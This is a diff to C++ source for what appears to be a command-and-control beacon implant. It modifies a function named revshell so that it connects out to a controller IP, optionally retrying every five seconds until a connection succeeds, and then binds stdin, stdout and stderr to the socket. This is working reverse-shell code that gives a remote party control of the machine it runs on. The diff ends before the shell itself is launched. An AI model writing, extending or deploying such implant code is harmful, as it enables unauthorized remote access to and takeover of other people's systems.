@@ -1,9 +1,12 @@
 #include <string>
 #include <vector>
 #include <array>
+#include <iostream>
 #include <include/beacon.hpp>
 #include <arpa/inet.h>
 #include <unistd.h>
+
+// #define WAIT_FOR_CLIENT
 
 typedef std::vector<std::string> ARGS;
 
@@ -29,10 +32,16 @@ int revshell(int port){
         sa.sin_addr.s_addr = inet_addr(get_ip_addr());
         int sockfd = socket(AF_INET, SOCK_STREAM, 0);
         sleep(1);
-        if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0){
-            return 101;
+        int cf;
+#ifdef WAIT_FOR_CLIENT
+        while (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+            sleep(5);
         }
-        
+#else
+        if ((cf = connect(sockfd, (struct sockaddr*)&sa, sizeof(sa))) != 0){
+            return cf;
+        }
+#endif
         dup2(sockfd, 0); //bind stdin to sock
         dup2(sockfd, 1); //bind stdout to sock
         dup2(sockfd, 2); //bind stderr to sock
